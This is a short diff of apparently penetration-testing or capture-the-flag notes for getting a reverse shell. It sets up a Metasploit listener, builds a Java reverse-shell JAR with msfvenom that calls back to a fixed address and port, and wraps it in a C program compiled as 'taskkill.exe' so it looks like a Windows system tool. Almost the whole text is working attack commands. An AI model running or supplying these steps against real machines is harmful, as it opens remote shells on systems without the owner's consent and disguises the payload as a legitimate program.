@@ -7,8 +7,10 @@ msfconsole -x "use multi/handler;set payload windows/meterpreter/reverse_tcp; se
 ==============================================================================
 [+] Create Payload 
 ==============================================================================
-
+# Create Payload
 msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.28 LPORT=9090 -f jar -o rev.jar
+# Create .c file
+
 vim taskkill.c  
 
 #include <stdlib.h>
@@ -16,5 +18,5 @@ vim taskkill.c
 int main() {
   system("java -jar rev.jar");
 }
-
+# Compile .exe
 x86_64-w64-mingw32-gcc -o taskkill.exe taskkill.c
